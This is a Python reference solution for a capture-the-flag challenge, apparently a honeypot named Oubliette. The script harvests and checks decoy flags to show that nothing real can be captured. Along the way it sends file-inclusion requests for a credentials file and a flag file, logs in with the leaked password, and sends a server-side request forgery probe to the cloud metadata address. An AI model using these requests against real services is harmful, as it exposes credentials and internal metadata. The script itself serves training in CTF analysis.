#!/usr/bin/env python3
"""
ZSCTF :: Oubliette -- reference "solve".

There is NO exploit. Oubliette is a honeypot/tarpit: no real flag is reachable.
This script is the reference ANALYSIS a sharp red-teamer performs to REACH THAT
CONCLUSION through evidence, rather than sinking time into the decoys. It:

  1. harvests every flag-shaped string the service emits (vault, LFI doc,
     SSRF preview);
  2. shows each one FAILS the strict zerosecurectf validator AND the integrity
     digest the service itself publishes;
  3. shows the published digest is sha256("") -- the empty-string digest -- i.e.
     the "correct flag" is empty: there is nothing to capture;
  4. shows the leads are canned/static (identical bytes regardless of input) and
     circle back on themselves;
  5. shows the service's own /validate rejects every candidate (including its
     own decoys).

Verdict: HONEYPOT. Disengage. Exit 0 means "correctly identified as a honeypot".

Usage:
    python solve.py --url http://HOST:PORT
"""
import sys
import re
import json
import hashlib
import argparse
from urllib.parse import urlencode
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError

STRICT = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")
FLAGISH = re.compile(r"zer[o0]securectf\{[^}]*\}", re.IGNORECASE)
EMPTY_SHA256 = hashlib.sha256(b"").hexdigest()


def get(url, timeout=20):
    req = Request(url, headers={"Accept": "*/*"})
    try:
        with urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.getheaders()), r.read().decode("utf-8", "replace")
    except HTTPError as e:
        return e.code, dict(e.getheaders()), e.read().decode("utf-8", "replace")


def getj(url):
    _, _, body = get(url)
    try:
        return json.loads(body)
    except Exception:
        return {}


def main():
    ap = argparse.ArgumentParser(description="Oubliette honeypot analysis (no exploit).")
    ap.add_argument("--url", required=True, metavar="http://HOST:PORT")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    try:
        # --- harvest the published integrity manifest ---
        manifest = getj(base + "/.well-known/zsctf-manifest.json")
        published = manifest.get("flag_sha256", "")
        print("[*] published flag_sha256 =", published)
        if published == EMPTY_SHA256:
            print("    -> that is sha256(b'') -- the empty-string digest.")
            print("    -> the 'correct flag' is EMPTY: there is nothing to capture.")

        # --- harvest every flag-shaped string the service emits ---
        candidates = set()

        # lead 1: login (creds leaked by the 'LFI' decoy) -> vault decoy flag
        _, _, creds = get(base + "/view?doc=config/credentials.ini")
        m = re.search(r"archivist\s*=\s*(\S+)", creds)
        if m:
            pw = m.group(1)
            st, hdrs, _ = get(base + "/login?" + urlencode({"user": "archivist", "pass": pw}))
            cookie = hdrs.get("Set-Cookie", "").split(";")[0]
            vreq = Request(base + "/vault", headers={"Cookie": cookie})
            try:
                with urlopen(vreq, timeout=20) as r:
                    vault = r.read().decode("utf-8", "replace")
            except HTTPError as e:
                vault = e.read().decode("utf-8", "replace")
            candidates.update(FLAGISH.findall(vault))

        # lead 2: the 'LFI' decoy flag file
        _, _, lfi = get(base + "/view?doc=secret/flag.txt")
        candidates.update(FLAGISH.findall(lfi))

        # lead 3: the 'SSRF' decoy preview
        ssrf = getj(base + "/fetch?" + urlencode({"url": "http://169.254.169.254/"}))
        candidates.update(FLAGISH.findall(ssrf.get("preview", "")))

        print("\n[*] flag-shaped strings harvested from the decoys:")
        all_bad = True
        for c in sorted(candidates):
            strict_ok = bool(STRICT.match(c))
            digest = hashlib.sha256(c.encode()).hexdigest()
            integ_ok = (digest == published)
            verdict = "REJECTED (fails strict format AND integrity digest)"
            if strict_ok or integ_ok:
                verdict = "*** unexpectedly valid ***"
                all_bad = False
            print("    - %-44s %s" % (c, verdict))

        # --- tell: the leads are canned/static (not a real filesystem/fetch) ---
        _, _, miss1 = get(base + "/view?doc=aaaaaa")
        _, _, miss2 = get(base + "/view?doc=zzz/qqq/" + "deadbeef")
        canned_fs = (miss1 == miss2)
        p1 = getj(base + "/fetch?" + urlencode({"url": "http://a.example/"})).get("preview")
        p2 = getj(base + "/fetch?" + urlencode({"url": "http://b.invalid:9/x"})).get("preview")
        canned_fetch = (p1 == p2)

        # --- tell: the service's own validator rejects every candidate ---
        self_reject = True
        for c in sorted(candidates):
            if getj(base + "/validate?" + urlencode({"flag": c})).get("valid"):
                self_reject = False

        print("\n[*] honeypot tells:")
        print("    - /view returns byte-identical stub for different inputs : %s" % canned_fs)
        print("    - /fetch returns byte-identical preview for different URLs: %s" % canned_fetch)
        print("    - /validate rejects every harvested candidate            : %s" % self_reject)
        print("    - published digest is sha256('')                         : %s"
              % (published == EMPTY_SHA256))

        ok = (candidates and all_bad and published == EMPTY_SHA256
              and canned_fs and canned_fetch and self_reject)
        print("\n[=] VERDICT:",
              "HONEYPOT / TARPIT -- no reachable flag. DISENGAGE." if ok
              else "inconclusive (service did not behave as the documented honeypot)")
        return 0 if ok else 1
    except (URLError, OSError) as e:
        print("[-] network error talking to %s: %s" % (base, e))
        return 2


if __name__ == "__main__":
    sys.exit(main())
